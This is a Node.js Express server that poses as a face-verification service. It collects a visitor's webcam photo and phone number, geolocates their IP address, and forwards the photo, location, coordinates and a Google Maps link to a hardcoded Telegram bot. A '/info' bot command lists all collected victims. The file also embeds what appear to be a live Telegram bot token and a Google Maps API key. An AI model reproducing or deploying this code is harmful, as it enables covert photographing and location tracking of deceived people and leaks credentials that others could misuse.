const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Hardcode token
const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN.substring(0, 10)}...`);
console.log(`📱 CHAT_ID: ${CHAT_ID}`);
console.log(`🌐 PORT: ${PORT}`);
console.log('========================================');

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// Database sederhana
const db = [];

// ===== GET LOCATION AKURAT =====
async function getLocationDetails(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    if (!cleanIp) return null;
    
    // Pake ip-api.com untuk data lengkap
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
    const data = await res.json();
    
    if (data.status === 'success') {
      return {
        ip: data.query,
        country: data.country || '-',
        countryCode: data.countryCode || '-',
        region: data.regionName || '-',
        city: data.city || '-',
        zip: data.zip || '-',
        latitude: data.lat || 0,
        longitude: data.lon || 0,
        timezone: data.timezone || '-',
        isp: data.isp || '-',
        org: data.org || '-',
        as: data.as || '-',
        fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
        googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`,
        googleMapsEmbed: `https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${data.lat || 0},${data.lon || 0}&zoom=15`
      };
    }
    return null;
  } catch (e) {
    console.error('Geolocation error:', e.message);
    return null;
  }
}

// ===== SEND TO TELEGRAM =====
async function sendToTelegram(photoBuffer, locationData, phone, ip) {
  try {
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
    caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
    caption += `🕒 *Waktu:* ${timestamp}\n\n`;
    
    if (locationData) {
      caption += `📍 *Lokasi:*\n`;
      caption += `   🏙️ ${locationData.fullLocation}\n`;
      caption += `   📮 Zip: ${locationData.zip}\n`;
      caption += `   🌐 Timezone: ${locationData.timezone}\n`;
      caption += `   📡 ISP: ${locationData.isp}\n\n`;
      
      caption += `🗺️ *Google Maps:*\n`;
      caption += `${locationData.googleMapsLink}\n\n`;
      
      caption += `📊 *Koordinat:*\n`;
      caption += `   ${locationData.latitude}, ${locationData.longitude}\n\n`;
    }
    
    caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
    caption += `_Foto diterima untuk verifikasi_`;

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('photo', photoBuffer, { 
      filename: `verifikasi_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });

    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
    
    // Kirim lokasi terpisah (opsional)
    if (locationData && locationData.latitude && locationData.longitude) {
      await sendLocation(locationData.latitude, locationData.longitude);
    }
    
    return tgData;
  } catch (err) {
    console.error('Send to Telegram error:', err);
    return null;
  }
}

// ===== SEND LOCATION =====
async function sendLocation(lat, lon) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        latitude: lat,
        longitude: lon
      })
    });
    const data = await response.json();
    console.log('📍 Location sent:', data.ok ? '✅ Success' : '❌ Failed');
    return data;
  } catch (err) {
    console.error('Send location error:', err);
    return null;
  }
}

// ===== WEBHOOK =====
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    console.log('📨 Webhook received');
    
    if (message && message.text === '/info') {
      const chatId = message.chat.id;
      const total = db.length;
      let response = `📊 *DATA VERIFIKASI*\n\n`;
      response += `Total: ${total} orang\n\n`;
      
      db.forEach((user, index) => {
        const lastIndex = db.length - 1;
        response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
        response += `   🕒 ${user.timestamp}\n`;
        response += `   📍 ${user.location || 'Tidak diketahui'}\n`;
        if (index < lastIndex) response += `\n`;
      });
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: response,
          parse_mode: 'Markdown'
        })
      });
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    res.sendStatus(500);
  }
});

// ===== VERIFY ENDPOINT =====
app.post('/verify', async (req, res) => {
  console.log('📸 ===== NEW VERIFICATION =====');
  console.log('📸 Time:', new Date().toISOString());
  
  try {
    const { image, phone } = req.body;
    
    if (!image) {
      console.log('❌ No image');
      return res.json({ success: false, error: 'No image' });
    }
    
    // Get IP
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    console.log(`🌐 IP: ${ip}`);
    
    // Get location details
    const locationData = await getLocationDetails(ip);
    console.log(`📍 Location:`, locationData ? locationData.fullLocation : 'Not found');
    
    // Process image
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    console.log(`📸 Image size: ${buffer.length} bytes`);
    
    // Save to database
    const userData = {
      phone: phone || `User_${Date.now().toString().slice(-6)}`,
      timestamp: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
      location: locationData ? locationData.fullLocation : 'Tidak diketahui',
      ip: ip,
      latitude: locationData ? locationData.latitude : 0,
      longitude: locationData ? locationData.longitude : 0,
      googleMaps: locationData ? locationData.googleMapsLink : '-'
    };
    db.push(userData);
    console.log('💾 Data saved');
    
    // Send to Telegram
    const result = await sendToTelegram(buffer, locationData, phone, ip);
    
    if (result && result.ok) {
      console.log('✅ Success!');
      res.json({ success: true });
    } else {
      console.log('❌ Failed to send to Telegram');
      res.json({ success: false, error: 'Telegram error' });
    }
    
  } catch (err) {
    console.error('❌ Error:', err);
    res.json({ success: false, error: err.message });
  }
});

// ===== TEST ENDPOINTS =====
app.get('/test', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/send', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '✅ Bot is working!'
      })
    });
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log('========================================');
});
